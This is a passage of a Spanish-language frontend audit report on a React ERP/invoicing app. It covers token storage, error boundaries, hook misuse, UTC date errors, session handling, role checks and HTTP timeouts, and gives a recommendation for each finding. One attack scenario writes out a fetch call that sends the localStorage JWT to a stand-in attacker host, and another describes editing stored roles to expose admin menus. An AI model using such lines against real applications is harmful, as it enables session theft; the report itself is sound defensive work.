Adicionalmente, el token se decodifica en el cliente y **se confía en sus claims para lógica de negocio**:
`defaultWarehouse` y `warehouses` se leen del payload del JWT para preseleccionar almacenes
(`auth.store.ts:36-41`, `auth.ts:29-37`). Un atacante puede reescribir el JWT en `localStorage` con un
payload arbitrario (la firma no se verifica en el cliente) y alterar el comportamiento de la UI. Esto solo
es una vulnerabilidad si el backend confía en esos valores cuando llegan en el cuerpo de la petición.

#### Location

- `src/shared/api/storage.ts:3-6` — definición de claves
- `src/shared/api/storage.ts:59-69` — `getToken` / `setToken` / `clearToken`
- `src/shared/api/client.ts:21-25` — inyección en el header `Authorization`
- `src/stores/auth.store.ts:6-12, 31-44` — `decodeJwt` y uso de claims
- `src/shared/api/auth.ts:21-27, 29-37` — `decodeJwt` duplicado

#### Evidence

```ts
// src/shared/api/storage.ts:3-6
const STORAGE_VERSION = 'v1'
const TOKEN_KEY = `gensuite:token:${STORAGE_VERSION}`
const TENANT_KEY = `gensuite:tenant:${STORAGE_VERSION}`
const USER_KEY = `gensuite:user:${STORAGE_VERSION}`
```

```ts
// src/stores/auth.store.ts:6-12  — se decodifica sin verificar firma (correcto en cliente,
// pero el resultado se usa para lógica, no solo para mostrar)
function decodeJwt(token: string): Record<string, unknown> {
  try {
    return JSON.parse(atob(token.split('.')[1]))
  } catch {
    return {}
  }
}
```

```ts
// src/stores/auth.store.ts:36-41  — claims del JWT usados para preseleccionar almacén
const jwtPayload = decodeJwt(token)
const hydratedUser: AuthUser = {
  ...user,
  defaultWarehouse: user.defaultWarehouse ?? (jwtPayload.defaultWarehouse as string) ?? undefined,
  warehouses: user.warehouses ?? (jwtPayload.warehouses as string[]) ?? undefined,
}
```

Nótese también que **`getUser()` deserializa JSON desde `localStorage` sin validación de esquema**
(`storage.ts:89-97`). Un objeto manipulado —por ejemplo con `roles: ['System Manager']`— hidrata el store
directamente y desbloquea los elementos de menú de administración (véase FE-009).

#### Failure / Attack Scenario

1. El atacante consigue ejecución de JS vía FE-003.
2. Ejecuta `fetch('https://atacante/?t=' + localStorage.getItem('gensuite:token:v1'))`.
3. Usa el token desde cualquier cliente HTTP hasta que expire. No necesita mantener a la víctima en la
   página, ni que la víctima siga conectada.

Variante sin XSS, de menor severidad pero probabilidad real: en un equipo compartido sin bloqueo de sesión,
cualquiera puede abrir DevTools y copiar el token de un usuario que dejó la sesión abierta. `localStorage`
persiste al cerrar el navegador, de modo que el token sigue ahí al día siguiente.

#### Impact

Suplantación completa y persistente de la sesión de la víctima con todos sus privilegios.

#### Likelihood

**Media**, condicionada a FE-003 para el vector remoto; **Alta** para el vector de acceso físico en equipo
compartido.

#### Recommendation

1. **Preferido:** migrar a cookie `HttpOnly; Secure; SameSite=Strict` emitida por el BFF. El token deja de
   ser accesible desde JS y el XSS ya no permite exfiltración. Requiere coordinación con el equipo de
   NestJS y resolver CSRF (véase FE-035); con `SameSite=Strict` el riesgo de CSRF es bajo.
2. **Alternativa intermedia:** mantener el token **solo en memoria** (en el store de Zustand, sin
   persistir) y aceptar que un refresco de página cierre la sesión, o combinarlo con un refresh token en
   cookie `HttpOnly`.
3. **Mínimo inmediato:** cerrar FE-003 (el único sink de XSS), añadir una CSP (FE-035) y reducir el tiempo
   de vida del token.
4. **No confiar en los claims del JWT para lógica.** `defaultWarehouse`/`warehouses` deben obtenerse de un
   endpoint autenticado, o el backend debe re-validar el almacén en cada operación e ignorar lo que llegue
   del cliente. Confirmar con el equipo de NestJS.
5. **Validar el esquema** de lo que se lee de `localStorage` (`getUser`, `getTenant`) con `zod` —ya es una
   dependencia del proyecto— antes de hidratar el store.

#### Related Components

FE-003 (vector de ejecución), FE-035 (CSP), FE-009 (roles manipulables), FE-038 (`decodeJwt` duplicado),
FE-032 (`X-Tenant` desde `localStorage`).

---

### [FE-005] Ausencia total de Error Boundaries

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Reliability / UX
**Priority:** P1

#### Description

No existe **ningún** Error Boundary en la aplicación. Una búsqueda de `componentDidCatch`,
`getDerivedStateFromError` y `ErrorBoundary` en todo `src/` devuelve **cero resultados**.

En React 19, una excepción no capturada durante el render, en un método de ciclo de vida o en el
constructor de cualquier componente provoca el **desmontaje del árbol completo**. Sin un boundary, el
usuario obtiene una **página en blanco**, sin mensaje, sin botón de recarga y sin forma de recuperar el
trabajo en curso.

Esto no es teórico en esta base de código: FE-006 describe una violación de las reglas de hooks que
produce exactamente ese crash de forma determinista. Además, con ~150 rutas, 193 `useEffect`, 356
mutaciones y transformaciones extensivas de datos que llegan de ERPNext (donde los campos opcionales
abundan), la superficie de excepciones en render es amplia.

#### Location

Ausencia global. Puntos donde deberían existir boundaries:

- `src/App.tsx:146-351` — raíz del router
- `src/App.tsx:154-346` — dentro de `ProtectedRoute`/`AppLayout`, por ruta
- `src/components/layout/AppLayout.tsx:1362-1368` — alrededor de `<KeepAlive>{outlet}</KeepAlive>`

#### Evidence

```
grep -rni "errorboundary|componentDidCatch|getDerivedStateFromError" src/
  → (sin resultados)
```

El `<Suspense fallback={<PageLoader />}>` que envuelve cada ruta **solo** captura la suspensión de la
carga diferida, no los errores de render. Un fallo al importar el chunk (red intermitente, deploy que
invalida los hashes de los chunks mientras el usuario tiene la app abierta) tampoco está cubierto: produce
una promesa rechazada que ningún boundary atrapa.

Ese último caso merece atención: tras cada despliegue, los usuarios con la pestaña abierta tienen
referencias a nombres de chunk que ya no existen en el servidor. La primera navegación a una ruta no
visitada falla el `import()` dinámico → **pantalla en blanco para todos los usuarios activos después de
cada deploy**.

#### Failure / Attack Scenario

1. Un usuario abre `/inventario/productos/ITEM-001` con atributos.
2. Se cumple la condición de FE-006 y React lanza `Rendered fewer hooks than expected`.
3. El árbol se desmonta. Pantalla en blanco. El formulario de al lado —en otra pestaña de la app, mantenida
   viva por `KeepAlive`— **también se pierde**, junto con todo lo que el usuario había escrito.
4. El usuario no tiene forma de saber qué pasó ni cómo volver. Recargar es la única salida.

Variante post-deploy: se publica una versión nueva; un usuario con la app abierta navega a una ruta cuyo
chunk cambió de hash; el `import()` falla con un error de red; pantalla en blanco.

#### Impact

Pérdida total de la interfaz y del trabajo no guardado. En formularios largos (una factura con 30 líneas,
un gasto con distribución contable) esto representa una cantidad significativa de trabajo perdido sin
posibilidad de recuperación —los borradores de `useDraft` solo se guardan cada 30 s y solo en formularios
nuevos, no en edición.

#### Likelihood

**Alta.** El escenario post-deploy ocurre en cada despliegue. FE-006 es determinista bajo su condición.

#### Recommendation

1. Añadir un **Error Boundary raíz** en `App.tsx` con una pantalla de fallo útil: mensaje, botón de
   recarga, e identificador de error para soporte.
2. Añadir un **boundary por ruta** (dentro de `AppLayout`, envolviendo el `outlet`), de modo que el fallo
   de una vista no derribe el layout, la barra de pestañas ni las demás pestañas vivas. Con `KeepAlive` y
   hasta 15 vistas montadas, el aislamiento por ruta es especialmente valioso.
3. Manejar específicamente el **fallo de carga de chunks**: detectar el error de `import()` dinámico y
   ofrecer recargar (`window.location.reload()`), que resuelve el caso post-deploy.
4. Enviar los errores capturados a un servicio de observabilidad. Hoy no hay ninguna visibilidad sobre
   fallos en producción.
5. Considerar `onError` global en el `QueryClient` para errores de datos, complementario a los boundaries.

#### Related Components

FE-006 (fuente determinista de crash), FE-020 (`KeepAlive` amplía el radio de impacto), FE-026 (sin tests
que detecten estos fallos), `useDraft`.

---

### [FE-006] `useQuery` invocado dentro de `.map()` — violación de las reglas de hooks

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Correctness / React
**Priority:** P1

#### Description

Dos componentes de `ItemDetail.tsx` llaman `useQuery` **dentro de un `.map()`** sobre los atributos del
artículo. El número de hooks ejecutados depende por tanto de `item.attributes.length`, un valor que
proviene de datos del servidor y **puede cambiar entre renders**.

React exige que el número y el orden de los hooks sea idéntico en cada render de un componente. Cuando no
lo es, lanza `Rendered fewer hooks than expected` (o `Rendered more hooks…`) y —sin Error Boundary
(FE-005)— la aplicación queda en blanco.

La violación está **explícitamente silenciada** con `// eslint-disable-next-line react-hooks/rules-of-hooks`
en ambos sitios, lo que indica que la regla se detectó y se suprimió en lugar de resolverse.

#### Location

- `src/features/catalog/ItemDetail.tsx:252-259` — `GenerateConfirmModal`
- `src/features/catalog/ItemDetail.tsx:313-320` — `CreateVariantModal`

#### Evidence

```tsx
// src/features/catalog/ItemDetail.tsx:250-259
const attributeIds = (item.attributes ?? []).map((a) => a.attribute)

// Load each attribute to count values
const attributeQueries = attributeIds.map((attrId) =>
  // eslint-disable-next-line react-hooks/rules-of-hooks
  useQuery({
    queryKey: ['attribute', attrId],
    queryFn: () => getAttribute(attrId),
    staleTime: 5 * 60_000,
  })
)
```

El bloque de `CreateVariantModal` (líneas 313-320) es idéntico. Además, en ese segundo componente los
hooks condicionales **preceden** a `useState` (líneas 322-324), de modo que un cambio en el número de
atributos desalinea también esos estados: los valores de `standardRate` y `attrValues` se leerían de las
posiciones equivocadas del array interno de hooks antes de que React detecte la discrepancia.

#### Failure / Attack Scenario

1. El usuario abre el detalle de un artículo *template* con 3 atributos y pulsa "Generar variantes".
   `GenerateConfirmModal` monta y ejecuta 3 `useQuery` → 3 hooks.
2. Mientras el modal está abierto, la query `['item', id]` se revalida (por invalidación tras una mutación
   en otra pestaña de la app, o al expirar el `staleTime`) y devuelve el artículo con 2 atributos —porque
   otro usuario eliminó uno, o porque el backend devolvió una respuesta parcial.
3. El siguiente render ejecuta 2 `useQuery` → 2 hooks, donde el render anterior ejecutó 3.
4. React lanza. Sin boundary: **pantalla en blanco**.

No hace falta concurrencia entre usuarios: basta con que `item.attributes` llegue como `undefined` en una
respuesta y como un array en otra. El `?? []` protege contra el crash de acceso, pero **no** contra el
cambio en el número de hooks: `undefined ?? []` produce 0 hooks, y la respuesta siguiente produce N.

#### Impact

Caída completa de la interfaz. Afecta a un flujo central del catálogo (generación de variantes de
artículo).

#### Likelihood

**Alta.** Cualquier revalidación que devuelva un número distinto de atributos lo dispara, y `ItemDetail`
invalida `['item', id]` tras varias de sus propias mutaciones.

#### Recommendation

1. Sustituir el `.map(useQuery)` por **`useQueries`** de TanStack Query, que está diseñado exactamente para
   un número dinámico de queries y ejecuta **un solo hook**:
   ```
   const attributeQueries = useQueries({
     queries: attributeIds.map((attrId) => ({ queryKey: ['attribute', attrId], queryFn: () => getAttribute(attrId), staleTime: 5 * 60_000 })),
   })
   ```
   Es un reemplazo casi directo: `useQueries` devuelve un array de resultados con la misma forma, por lo
   que `attributeQueries.every(...)` y `attributeQueries.reduce(...)` siguen funcionando sin cambios.
2. **Eliminar los `eslint-disable`** una vez corregido, y tratar `react-hooks/rules-of-hooks` como error no
   silenciable en la configuración de ESLint.
3. Alternativa: extraer un componente hijo por atributo, cada uno con su propio `useQuery`. Más verboso y
   con más re-renders; `useQueries` es preferible.

#### Related Components

FE-005 (sin boundary el fallo es total), FE-026 (sin tests no se detecta), `ItemDetail`, `AttributesPage`.

---

### [FE-007] La fecha "hoy" se calcula en UTC — documentos fiscales con fecha equivocada

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Financial / Fiscal Correctness
**Priority:** P1

#### Description

En **30 puntos del código** la fecha por defecto de un documento se obtiene con
`new Date().toISOString().slice(0, 10)` (o `.split('T')[0]`, o `.substring(0, 7)` para meses).
`toISOString()` devuelve siempre **UTC**.

República Dominicana opera en **UTC−4 todo el año** (no aplica horario de verano). Por tanto, entre las
**20:00 y las 23:59 hora local**, `toISOString()` ya devuelve **la fecha del día siguiente**.

Toda operación registrada en esa franja —que en un negocio con caja, turnos de tarde o cierre nocturno es
una franja de actividad real— se asienta con **fecha del día siguiente**.

#### Location

30 ocurrencias. Las de mayor impacto contable:

| Archivo | Línea | Campo afectado |
|---|---|---|
| `src/features/invoicing/InvoiceForm.tsx` | (estado `postingDate`) | Fecha de factura de venta |
| `src/features/compras/CompraForm.tsx` | 571, 1139-1141 | `postingDate` y `dueDate` de compra |
| `src/features/compras/RecepcionForm.tsx` | 426 | Fecha de recepción de mercancía |
| `src/features/gastos/GastoForm.tsx` | 129 | Fecha de gasto |
| `src/features/cobros/PagoPage.tsx` | 52, 301 | Fecha de cobro |
| `src/features/journal/JournalForm.tsx` | 53 | Fecha de asiento contable |
| `src/features/inventory/CountsPage.tsx` | 154 | Fecha de conteo de inventario |
| `src/features/reportes/ReportesPage.tsx` | 117-118 | Rango por defecto de reportes (606/607) |
| `src/features/gastos/GastosPage.tsx` | 42 | Mes por defecto del filtro |
| `src/features/config/NcfPage.tsx` | 169, 172, 302, 729 | Vigencia de secuencias NCF |
| `src/features/config/EcfSequencesPanel.tsx` | 71-72, 166-167 | Vigencia de secuencias e-NCF |
| `src/features/compras/CostosImportacionPage.tsx` | 36 | Fecha de costo de importación |

#### Evidence

```ts
// src/features/journal/JournalForm.tsx:53
const today = new Date().toISOString().slice(0, 10)
```

```ts
// src/features/reportes/ReportesPage.tsx:117-118
function today() { return new Date().toISOString().slice(0, 10) }
function monthStart() { const d = new Date(); d.setDate(1); return d.toISOString().slice(0, 10) }
```

`monthStart()` es doblemente incorrecto: `d.setDate(1)` opera en hora **local** y `toISOString()` convierte
después a **UTC**, de modo que el día 1 local a las 20:00 produce el día 2 en UTC. El rango por defecto de
los reportes fiscales 606/607 puede así **omitir el primer día del mes**.

```ts
// src/features/compras/CompraForm.tsx:1139-1141  — aritmética de fechas sobre el mismo error
const base = new Date(postingDate || new Date().toISOString().split('T')[0])
// ... suma de días de crédito ...
setDueDate(base.toISOString().split('T')[0])
```

Aquí se agrava: `new Date('2026-08-28')` se interpreta como **medianoche UTC**, que en RD es las 20:00 del
día 27. Cualquier aritmética posterior arrastra ese desfase, y el `toISOString()` final puede devolver un
día antes o después según la operación.

#### Failure / Attack Scenario

Un cajero factura a las 21:30 del **28 de agosto** (hora dominicana).
`new Date().toISOString().slice(0,10)` devuelve `"2026-08-29"`.
La factura se registra con fecha **29 de agosto**.

Consecuencias en cadena:

- El **cuadre de caja del día 28** no incluye esa factura: el arqueo no cuadra contra el efectivo real.
- La factura aparece en el período fiscal equivocado si el 28 es fin de mes → **el reporte 606/607 del mes
  se emite incompleto** y el del mes siguiente incluye una operación ajena.
- Si el 28 es el último día de un ejercicio cerrado, el documento cae en un período ya cerrado o fuerza un
  ajuste manual.
- El NCF consumido pertenece a la secuencia correcta, pero la fecha del comprobante no coincide con la
  fecha real de la operación — una **discrepancia frente a la DGII**.

Para las secuencias NCF/e-NCF (`NcfPage`, `EcfSequencesPanel`), el `min` del campo de fecha es "hoy" en
UTC: entre las 20:00 y medianoche **el formulario rechaza la fecha de hoy real** como si estuviera en el
pasado.

#### Impact

Corrupción sistemática de fechas contables y fiscales. Descuadres de caja, reportes DGII incorrectos,
documentos en períodos equivocados. En un sistema de facturación fiscal esto tiene consecuencias de
cumplimiento tributario, no solo de usabilidad.

#### Likelihood

**Alta.** Determinista para toda operación entre las 20:00 y las 23:59 hora local. Un negocio con horario
de tarde/noche lo sufre a diario.

#### Recommendation

1. Introducir un helper único en `src/lib/formatters.ts` que devuelva la fecha **local** en formato
   `yyyy-MM-dd`, y sustituir las 30 ocurrencias:
   ```
   import { format } from 'date-fns'
   export function todayLocal(): string { return format(new Date(), 'yyyy-MM-dd') }
   ```
   `date-fns` ya es dependencia del proyecto y `format` opera en hora local, que es exactamente lo que se
   necesita.
2. Para el mes: `format(new Date(), 'yyyy-MM')` y `format(startOfMonth(new Date()), 'yyyy-MM-dd')`.
3. **Nunca usar `new Date('yyyy-MM-dd')`** para fechas de calendario: se interpreta como UTC. Usar
   `parseISO` de `date-fns`, que la interpreta como local, o `startOfDay`.
4. Revisar la aritmética de `dueDate` en `CompraForm.tsx:1139-1141` con `addDays` de `date-fns`.
5. **Definir la zona horaria de referencia con el equipo de backend.** Si el BFF/ERPNext interpretan las
   fechas recibidas en otra zona, corregir solo el frontend puede desplazar el problema. Lo correcto es
   acordar que el campo es una **fecha de calendario sin zona** y tratarla como tal en ambos extremos.
6. Añadir tests con la zona horaria fijada a `America/Santo_Domingo` y reloj congelado a las 22:00 — es el
   caso que hoy falla y que ningún test cubre (FE-026).

#### Related Components

FE-026 (sin tests), `ReportesPage` (606/607), `NcfPage`, `EcfSequencesPanel`, `CajaPage`, `PorCobrarPage`.

---

### [FE-008] Sin manejo de expiración de sesión ni refresh token

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Session Management / UX
**Priority:** P1

#### Description

No existe mecanismo de refresh token. El sistema de sesión se reduce a: un access token en `localStorage`
y, ante cualquier 401 que no sea del propio login, `clearSession()` seguido de
`window.location.href = '/login'`.

Consecuencias:

1. **Pérdida silenciosa de trabajo.** El redirect es una navegación dura del documento. Todo formulario en
   curso —una factura de 30 líneas, un gasto con distribución contable— se pierde sin aviso ni
   confirmación. `useBeforeUnloadWarning` no se dispara porque la asignación a `location.href` desde código
   no siempre activa el diálogo, y en cualquier caso el usuario no puede evitar la navegación.
2. **Sin aviso previo de expiración.** El usuario no sabe que su sesión está por caducar; se entera al
   perder el trabajo.
3. **No se preserva el destino.** Se redirige a `/login` sin `?next=`, de modo que tras reautenticarse el
   usuario aterriza en `/dashboard` y debe volver a navegar. Irónicamente `LoginPage` **sí** lee un
   parámetro `next` (línea 39), pero **nadie lo escribe nunca** — código muerto que además abre la
   superficie de FE-014.
4. **Redirecciones múltiples concurrentes.** Si varias peticiones fallan con 401 a la vez (habitual: una
   página monta 5-8 queries en paralelo), cada una ejecuta `clearSession()` y asigna `location.href`. El
   navegador coalesce las navegaciones, así que no hay bucle, pero sí trabajo redundante y condiciones de
   carrera en la limpieza.
5. **Sin reintento.** La petición que provocó el 401 se pierde. Con un refresh token, lo correcto sería
   renovar y reintentar de forma transparente.

#### Location

- `src/shared/api/client.ts:52-71` — manejo de 401 y `ERPNEXT_AUTH_ERROR`
- `src/pages/LoginPage.tsx:39` — `next` leído pero nunca escrito
- `src/components/ProtectedRoute.tsx:5-7` — redirige a `/login` sin preservar destino

#### Evidence

```ts
// src/shared/api/client.ts:52-71
const isLoginRequest = error.config?.url?.includes('/auth/login')

if (status === 401 && !isLoginRequest) {
  clearSession()
  window.location.href = '/login'      // navegación dura, sin next, sin aviso
  return Promise.reject(error)
}

if (!isLoginRequest && data?.error?.code === 'ERPNEXT_AUTH_ERROR') {
  clearSession()
  window.location.href = '/login?sessionExpired=1'
  return Promise.reject(data.error)
}
```

Obsérvese la incoherencia: `ERPNEXT_AUTH_ERROR` **sí** informa al usuario (`?sessionExpired=1`), pero el
401 genuino de expiración de sesión —el caso más frecuente— **no**. El usuario ve la pantalla de login sin
explicación alguna.

```tsx
// src/components/ProtectedRoute.tsx:5-7
const isAuthenticated = useAuthStore((s) => s.isAuthenticated)
return isAuthenticated ? <Outlet /> : <Navigate to="/login" replace />
// no propaga location.pathname como ?next=
```

Detalle adicional: la detección de la petición de login usa `url?.includes('/auth/login')`, una
comprobación por subcadena. Cualquier endpoint futuro cuya URL contenga esa subcadena quedaría exento del
manejo de 401 de forma no intencionada.

#### Failure / Attack Scenario

1. Un usuario dedica 20 minutos a capturar una factura de compra con 25 líneas y distribución por centros
   de costo.
2. El token expira mientras trabaja (no hay refresh, no hay aviso).
3. Pulsa "Guardar". El POST devuelve 401.
4. `clearSession()` + `location.href='/login'`. **Los 20 minutos de captura se pierden.** Ninguna
   confirmación, ningún mensaje, ninguna oportunidad de copiar los datos.
5. Tras reautenticarse aterriza en `/dashboard`, no en el formulario.

`useDraft` no rescata este caso: solo guarda borradores en documentos **nuevos** (`if (!isNew) return`) y
solo cada 30 segundos.

#### Impact

Pérdida recurrente de trabajo del usuario en los flujos de captura más largos y valiosos del sistema.
Frustración operativa y riesgo de que se reintroduzcan datos de forma inconsistente.

#### Likelihood

**Alta.** Cualquier sesión suficientemente larga lo produce, y la captura de documentos de compra/gasto es
precisamente una tarea larga.

#### Recommendation

1. **Implementar refresh token** con el equipo de NestJS. En el interceptor: ante un 401, intentar el
   refresh **una sola vez**, encolar las peticiones concurrentes en una única promesa de refresh compartida
   (patrón de *single-flight*) y reintentar. Solo si el refresh falla, cerrar sesión. Esto resuelve además
   el punto 4 (redirecciones concurrentes).
2. **Preservar el destino:** redirigir a `/login?next=${encodeURIComponent(location.pathname + location.search)}`
   tanto en el interceptor como en `ProtectedRoute` — con la validación de FE-014 al consumirlo.
3. **Avisar siempre**: usar `?sessionExpired=1` también para el 401 genuino, no solo para
   `ERPNEXT_AUTH_ERROR`.
4. **Advertir antes de expirar.** Decodificar `exp` del JWT (ya existe `decodeJwt`) y mostrar un aviso con
   opción de renovar 2 minutos antes del vencimiento.
5. **No perder el trabajo:** ante un 401 en una mutación, conservar el estado del formulario (borrador en
   `localStorage` o en memoria) y restaurarlo tras la reautenticación. Ampliar `useDraft` para cubrir
   también la edición, no solo la creación.
6. Sustituir `url?.includes('/auth/login')` por una comparación exacta con `ENDPOINTS.auth.login`.

#### Related Components

FE-001 (el redirect duro sí limpia memoria — incoherente con el logout, que no), FE-014 (`next`),
FE-015 (multipestaña), `useDraft`, `useBeforeUnloadWarning`.

---

### [FE-009] Sin autorización a nivel de ruta; la paleta de comandos expone rutas de administración

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Authorization / Broken Access Control (UI)
**Priority:** P1

#### Description

`ProtectedRoute` comprueba **únicamente** `isAuthenticated`. Ninguna de las ~150 rutas declara requisitos
de rol o permiso. El único control de autorización del frontend es **cosmético**: `stripAdminOnlyEntry`
elimina del menú lateral las entradas de `ADMIN_ONLY_PATHS` para quien no tenga el rol `System Manager`.

Ese filtrado se elude por tres vías:

1. **URL directa.** `/config/permisos`, `/config/roles`, `/usuarios`, `/config/ecf/admin` son accesibles
   escribiéndolas en la barra de direcciones.
2. **Paleta de comandos (⌘K).** `CommandPalette` mantiene su propia lista de destinos y **no aplica el
   filtro por rol**. La entrada `usuarios` (línea 74) se ofrece a cualquier usuario autenticado.
3. **Manipulación de `localStorage`.** El rol se lee de `gensuite:user:v1`, deserializado sin validación
   (FE-004). Editando ese JSON para incluir `roles: ["System Manager"]` y recargando, el menú de
   administración aparece completo.

**Esto no es, por sí solo, una vulnerabilidad si el backend valida correctamente** — y hay indicios sólidos
de que lo hace: `PermisosPage`, `RolesPage` y `RoleDetailPage` manejan explícitamente el 403 y degradan con
un mensaje. El comentario de `useIsSystemManager` es explícito: *"el backend devuelve 403 si no lo tiene"*.

El problema real es de **coherencia y de diseño**: la aplicación transmite que el control existe (oculta el
menú) pero no lo aplica donde importa, produciendo estados rotos y una falsa señal de seguridad para quien
lea el código.

#### Location

- `src/components/ProtectedRoute.tsx:1-7`
- `src/App.tsx:154-346` — todas las rutas dentro de un único `ProtectedRoute`
- `src/components/layout/AppLayout.tsx:561-571` — `stripAdminOnlyEntry`
- `src/components/layout/AppLayout.tsx:1000-1002` — aplicación del filtro
- `src/components/layout/CommandPalette.tsx:74` — `/usuarios` sin filtrar
- `src/shared/hooks/useIsSystemManager.ts:1-14`

#### Evidence

```tsx
// src/components/ProtectedRoute.tsx  — íntegro
export function ProtectedRoute() {
  const isAuthenticated = useAuthStore((s) => s.isAuthenticated)
  return isAuthenticated ? <Outlet /> : <Navigate to="/login" replace />
}
```

```ts
// src/components/layout/AppLayout.tsx:561-571  — filtrado solo del menú
function stripAdminOnlyEntry(entry: NavEntry): NavEntry | null {
  if (isGroup(entry)) {
    const children = entry.children.map(stripAdminOnlyEntry).filter((c): c is NavEntry => c !== null);
    return children.length ? { ...entry, children } : null;
  }
  return ADMIN_ONLY_PATHS.has(entry.path) ? null : entry;
}
```

```tsx
// src/components/layout/CommandPalette.tsx:74  — sin comprobación de rol
{ id: 'usuarios', label: 'Usuarios', group: 'Finanzas', path: '/usuarios', icon: <UserCog size={15} />, keywords: 'users roles acceso' },
```

```ts
// src/shared/hooks/useIsSystemManager.ts:11-13  — el rol se lee del store, hidratado desde localStorage
export function useIsSystemManager(): boolean {
  return useAuthStore((s) => s.user?.roles?.includes(SYSTEM_MANAGER_ROLE) ?? false)
}
```

#### Failure / Attack Scenario

**Escenario de UX rota (el más probable).** Un cajero pulsa ⌘K, escribe "usuarios" y pulsa Enter. Navega a
`/usuarios`. La página monta, lanza sus queries, el backend responde 403 y —a diferencia de `PermisosPage`,
que sí lo maneja— `UsuariosPage` no tiene tratamiento específico de 403: el usuario obtiene una página rota
o un toast de error genérico, sin entender por qué el sistema le ofreció un destino al que no puede
acceder.

**Escenario de exploración dirigida.** Un usuario curioso edita `gensuite:user:v1` en DevTools añadiendo
`"System Manager"` a `roles` y recarga. El menú completo de administración aparece: Permisos, Roles,
e-CF Admin, Ajustes Avanzados. Puede navegar por todas esas pantallas. **Los datos no se filtran** (el
backend responde 403), pero el usuario obtiene un mapa detallado de la superficie administrativa del
sistema y confirmación de qué endpoints existen.

**Riesgo residual real.** El control depende **por completo** de que el BFF valide **cada** endpoint
administrativo. Basta con que uno solo omita la comprobación para que el hallazgo pase de cosmético a
explotable — y el frontend no ofrece ninguna defensa en profundidad.

#### Impact

Estados de UI rotos y confusos; divulgación de la estructura administrativa; dependencia total y no
verificada de la validación del backend, sin defensa en profundidad.

#### Likelihood

**Alta** para los estados rotos (uso normal); **Media** para la manipulación deliberada.

#### Recommendation

1. **Introducir guardas de ruta por rol.** Un componente `<RequireRole role="System Manager">` que envuelva
   los grupos de rutas administrativas y redirija a una página "403 — sin permisos" clara, en lugar de
   dejar montar la página.
2. **Derivar el menú, la paleta y las guardas de una única fuente de verdad.** Hoy `ADMIN_ONLY_PATHS`
   (AppLayout) y la lista de `CommandPalette` son independientes y ya están desincronizadas. Un único
   registro de rutas con metadatos (`{ path, label, requiredRole }`) del que se generen los tres consumidores
   elimina la clase entera de bug.
3. **Filtrar `CommandPalette` por rol**, como corrección inmediata de bajo coste.
4. **Validar el objeto de usuario** al hidratarlo desde `localStorage` (zod), para que un `roles`
   manipulado no hidrate el store (FE-004).
5. **Auditar en el repositorio de NestJS** que todos los endpoints administrativos (`/permisos`, `/roles`,
   `/usuarios`, `/config/ecf/admin/*`, `/config/ajustes-avanzados`) exigen el rol. *Esto NO es una
   vulnerabilidad del frontend por sí mismo si el backend valida correctamente, pero debe confirmarse
   endpoint por endpoint que el backend no confía en esta restricción de UI.*
6. Manejar el 403 de forma consistente en todas las páginas administrativas, como ya hacen `PermisosPage`,
   `RolesPage` y `RoleDetailPage`.

#### Related Components

FE-004 (roles manipulables), FE-002 (`X-Admin-Pin`), `useIsSystemManager`, `CommandPalette`, `AppLayout`.

---

### [FE-010] Sin timeout HTTP — la interfaz se cuelga indefinidamente

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Resilience
**Priority:** P1

#### Description

La instancia de axios se crea sin `timeout`. El valor por defecto de axios es `0`, es decir, **sin límite**.
Si el BFF NestJS o ERPNext aceptan la conexión pero no responden —situación típica bajo saturación, con un
worker de ERPNext bloqueado, o con una consulta que degenera—, la petición **nunca resuelve ni rechaza**.

Consecuencias en cadena:

- `isPending` de la mutación permanece `true` **para siempre**.
- El botón de guardar queda deshabilitado indefinidamente (`disabled={isSaving}`).
- El spinner gira sin fin. No hay mensaje de error, ni reintento, ni forma de cancelar.
- El usuario no tiene más salida que recargar la página, **perdiendo el trabajo** (no hay borrador en
  edición, FE-008).

Y, críticamente, **el usuario no sabe si la operación se ejecutó**. Si recarga y reintenta, puede generar
un documento duplicado (FE-033).

Agrava el cuadro la ausencia de `AbortController` en toda la aplicación (FE-039): las peticiones tampoco se
cancelan al desmontar el componente ni al cambiar de pestaña.

#### Location

- `src/shared/api/client.ts:10-13`

#### Evidence

```ts
// src/shared/api/client.ts:10-13
export const client = axios.create({
  baseURL: BASE_URL,
  headers: { 'Content-Type': 'application/json' },
  // sin `timeout` → axios usa 0 = sin límite
})
```

```
grep -rn "timeout" src/shared/api/
  → (sin resultados)

grep -rn "AbortController|signal" src/
  → src/shared/api/types.ts:3241 (un comentario, no código)
```

El interceptor de respuesta contempla el caso "sin `error.response`" y devuelve `NETWORK_ERROR`
(`client.ts:42-48`), lo que indica que se pensó en el fallo de red. Pero ese camino **solo se activa si la
petición efectivamente falla**; una petición colgada nunca llega a él.

#### Failure / Attack Scenario

1. ERPNext se satura al mediodía (cierre de mes, varios reportes 606 en paralelo). El BFF acepta la
   conexión y queda esperando a ERPNext.
2. El cajero pulsa "Cobrar" sobre una factura. `POST /invoices/:id/cobrar` se queda colgado.
3. Spinner infinito. Botón bloqueado. Sin mensaje.
4. Tras tres minutos, el cajero recarga. Ahora **no sabe si el cobro se registró**.
5. Vuelve a cobrar → **doble cobro** si la primera petición sí llegó a ejecutarse en ERPNext.

Con `KeepAlive` manteniendo hasta 15 vistas montadas (FE-020), cada una con sus queries colgadas, el
navegador puede acumular peticiones pendientes hasta agotar el límite de conexiones concurrentes por
origen (6 en HTTP/1.1), **bloqueando también las peticiones nuevas** que sí podrían responder.

#### Impact

Interfaz inutilizable durante incidentes del backend, precisamente cuando el usuario más necesita entender
qué ocurre. Riesgo de operaciones financieras duplicadas. Agotamiento del pool de conexiones del navegador.

#### Likelihood

**Alta.** ERPNext bajo carga es un escenario frecuente y esperable en cierre de mes.

#### Recommendation

1. **Fijar un `timeout` por defecto** en la instancia (p. ej. 30 s):
   ```
   export const client = axios.create({ baseURL: BASE_URL, timeout: 30_000, headers: { ... } })
   ```
   Y un timeout mayor y explícito por petición para las operaciones legítimamente largas (generación de
   PDF, reportes 606/607, exportación a Excel).
2. **Mapear `ECONNABORTED`** en el interceptor a un error de dominio propio (`TIMEOUT_ERROR`) con un
   mensaje accionable: *"El servidor tardó demasiado en responder. Verifica si la operación se completó
   antes de reintentar."* — el aviso importa para evitar el duplicado.
3. **Adoptar `AbortController`** con el `signal` que TanStack Query ya provee a `queryFn`, para que las
